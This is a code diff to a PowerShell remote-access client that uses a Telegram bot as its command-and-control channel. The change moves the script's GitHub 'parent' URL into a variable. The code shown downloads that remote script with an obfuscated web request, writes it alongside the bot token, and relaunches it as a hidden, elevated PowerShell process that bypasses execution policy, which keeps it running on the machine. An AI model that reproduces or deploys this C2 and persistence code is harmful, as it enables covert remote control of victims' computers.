@@ -19,6 +19,7 @@ $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token
 # Define Connection Variables
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
+$parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $URL='https://api.telegram.org/bot{0}' -f $Token
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $AcceptedSession=""
@@ -401,7 +402,7 @@ sleep 1
 if ($newScriptPath.Length -lt 100){
     "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
     "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
-    i`wr -Uri "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" -OutFile "$env:temp/temp.ps1"
+    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
     sleep 1
     Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
     }
@@ -430,7 +431,7 @@ $scriptContent | Out-File -FilePath $newScriptPath -force
 if ($newScriptPath.Length -lt 100){
     "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
     "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
-    i`wr -Uri "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" -OutFile "$env:temp/temp.ps1"
+    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
     Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
     }
 $tobat = @'
@@ -466,7 +467,7 @@ if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
     if ($newScriptPath.Length -lt 100){
         "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
         "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
-        i`wr -Uri "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" -OutFile "$env:temp/temp.ps1"
+        i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
         Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
         }
     Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -File `"$env:APPDATA\Microsoft\Windows\temp.ps1`"") -Verb RunAs
